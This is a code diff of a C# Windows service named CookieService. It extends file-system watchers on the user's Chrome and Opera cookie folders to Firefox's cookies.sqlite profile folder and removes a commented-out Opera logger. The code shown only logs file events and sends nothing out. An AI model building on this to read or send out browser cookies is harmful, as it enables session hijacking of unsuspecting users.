@@ -99,13 +99,14 @@ namespace CookieService
             {
                 try
                 {
-                    FileSystemWatcher[] fileWatchers = new FileSystemWatcher[2] { new FileSystemWatcher(Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Local\Google\Chrome\User Data\Default"), 
-                    new FileSystemWatcher(Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Roaming\Opera Software\Opera Stable")};
+                    FileSystemWatcher[] fileWatchers = new FileSystemWatcher[3] { new FileSystemWatcher(Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Local\Google\Chrome\User Data\Default"), 
+                    new FileSystemWatcher(Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Roaming\Opera Software\Opera Stable"),
+                    new FileSystemWatcher(Directory.GetFiles(Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{GetUserName()}" + @"\AppData\Roaming\Mozilla\Firefox\Profiles", "cookies.sqlite", SearchOption.AllDirectories)[0].Replace(@"\cookies.sqlite", string.Empty))};
 
                     EventLog.WriteEntry("fileWatchers done");
                     loggerEnabled = true;
 
-                    foreach(FileSystemWatcher fileWatcher in fileWatchers)
+                    foreach (FileSystemWatcher fileWatcher in fileWatchers)
                     {
                         fileWatcher.Deleted += Watcher_Deleted;
                         fileWatcher.Created += Watcher_Created;
@@ -115,14 +116,10 @@ namespace CookieService
                         fileWatcher.EnableRaisingEvents = true;
                     }
 
-                    try
+                    while (loggerEnabled)
                     {
-                        while (loggerEnabled)
-                        {
-                            Thread.Sleep(3000);
-                        }
+                        Thread.Sleep(1000);
                     }
-                    catch (Exception e) { EventLog.WriteEntry(e.Message); }
                 }
                 catch (Exception e) { EventLog.WriteEntry(e.Message); }
             }        
@@ -155,38 +152,6 @@ namespace CookieService
         //                }
         //            } catch (Exception e) { EventLog.WriteEntry(e.Message); }
         //        } catch (Exception e) { EventLog.WriteEntry(e.Message); }
-        //    }
-        //}
-
-        //private void StartOperaLogger()
-        //{
-        //    lock (this)
-        //    {
-        //        try
-        //        {
-        //            string cookiePath = Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Roaming\Opera Software\Opera Stable";
-        //            EventLog.WriteEntry(cookiePath);
-        //            loggerEnabled = true;
-
-        //            FileSystemWatcher operaWatcher = new FileSystemWatcher(cookiePath);
-
-        //            operaWatcher.Deleted += Watcher_Deleted;
-        //            operaWatcher.Created += Watcher_Created;
-        //            operaWatcher.Changed += Watcher_Changed;
-        //            operaWatcher.Renamed += Watcher_Renamed;
-    
-        //            operaWatcher.EnableRaisingEvents = true;
-
-        //            try
-        //            {
-        //                while (loggerEnabled)
-        //                {
-        //                    Thread.Sleep(3000);
-        //                }
-        //            }
-        //            catch (Exception e) { EventLog.WriteEntry(e.Message); }
-        //        }
-        //        catch (Exception e) { EventLog.WriteEntry(e.Message); }
         //    }
         //}
 
